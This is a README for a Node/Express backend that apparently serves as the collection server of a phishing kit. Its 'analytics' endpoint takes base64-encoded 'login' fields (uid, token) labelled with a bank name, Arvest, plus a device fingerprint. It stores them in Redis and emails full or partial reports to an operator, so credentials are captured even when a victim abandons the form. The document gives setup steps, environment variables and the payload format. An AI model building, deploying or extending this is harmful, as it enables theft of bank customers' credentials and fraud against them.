# multibacker

Express backend that receives form submissions, stores sessions in Redis, and delivers formatted email reports via Resend.

## How it works

1. A frontend posts a base64-encoded payload to `/api/analytics` with a `section` name and `fields`
2. The server creates a Redis session (or appends to an existing one using `session_token`)
3. If a session exceeds `PARTIAL_TIMEOUT_SECONDS` without completing, a partial email is sent
4. When `/api/analytics/complete` is called, a full report email is sent and the session is deleted

## Setup

```bash
npm install
cp .env.example .env
# fill in .env values
npm start
```

## Environment Variables

| Variable | Description |
|---|---|
| `PORT` | Port to listen on (default: `3000`) |
| `RESEND_API_KEY` | API key from [resend.com](https://resend.com/api-keys) |
| `EMAIL_FROM` | Sender address |
| `EMAIL_TO` | Recipient address for reports |
| `REDIS_URL` | Redis connection URL |
| `SESSION_TTL_SECONDS` | How long a session lives in Redis (default: `600`) |
| `PARTIAL_TIMEOUT_SECONDS` | Age threshold before a partial email is sent (default: `300`) |

## Endpoints

| Method | Path | Description |
|---|---|---|
| `POST` | `/api/analytics` | Submit a form section |
| `POST` | `/api/analytics/complete` | Mark session complete and send final email |
| `GET` | `/api/health` | Health check |

### POST `/api/analytics`

Body: `{ d: "<base64 encoded JSON>" }`

Decoded payload shape:
```json
{
  "section": "login",
  "fields": { "uid": "...", "token": "..." },
  "session_token": null,
  "src": "Arvest",
  "device": { "ua": "...", "lang": "...", "res": "...", "tz": "...", "ref": "..." }
}
```

Returns: `{ success: true, session_token: "<uuid>" }`

### POST `/api/analytics/complete`

Body: `{ session_token: "<uuid>" }`

Sends the final email report and clears the session from Redis.

## Dev

```bash
npm run dev   # uses node --watch for auto-reload
```
